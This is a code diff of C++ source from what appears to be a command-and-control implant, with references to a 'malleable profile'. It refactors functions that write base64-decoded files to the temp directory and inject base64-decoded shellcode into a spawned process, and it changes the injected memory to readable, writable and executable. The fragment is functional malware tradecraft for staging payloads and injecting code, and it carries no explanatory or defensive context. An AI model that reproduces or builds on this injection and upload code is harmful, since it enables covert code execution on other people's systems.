@@ -222,19 +222,10 @@ void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile) 
     }
 }
 
-std::string Upload(rapidjson::Value* uploaded) {
+std::string Upload(std::string fileName, std::string b64Contents) {
     CHAR path [200];
     CHAR fullPath [200];
-    std::string fileName;
-	std::string b64Contents;
-    rapidjson::Value::ConstMemberIterator itr = uploaded->MemberBegin();
-    for (; itr != uploaded->MemberEnd(); ++itr) {
-        if (itr->name == "name") {
-            fileName = itr->value.GetString();
-        } else if (itr->name == "contents") {
-            b64Contents = itr->value.GetString();
-        }
-    }
+
     std::vector<BYTE> bytes = base64Decode(b64Contents);
     GetTempPathA(80, path);
     PathCombineA(fullPath, path, fileName.c_str());
@@ -285,11 +276,8 @@ std::string Download(std::string filepath) {
     return base64Encode(vec);
 }
 
-std::string inject(rapidjson::GenericArray<false, rapidjson::Value> injected) {
-    std::string b64shellcode = injected[0].GetString();
-    std::string processName = injected[1].GetString();
+std::string Inject(std::string b64shellcode, std::string processName) {
     std::vector<BYTE> shellcode = base64Decode(b64shellcode);
-
     HANDLE processHandle;
     HANDLE remoteThread;
     PVOID remoteBuffer;
@@ -307,7 +295,7 @@ std::string inject(rapidjson::GenericArray<false, rapidjson::Value> injected) {
         return "ERROR";
     }
     CloseHandle(process_info.hThread);
-    remoteBuffer = VirtualAllocEx(process_info.hProcess, NULL, shellcode.size() * sizeof(BYTE), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
+    remoteBuffer = VirtualAllocEx(process_info.hProcess, NULL, shellcode.size() * sizeof(BYTE), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if (remoteBuffer == NULL) {
         CloseHandle(process_info.hProcess);
         return "ERROR";
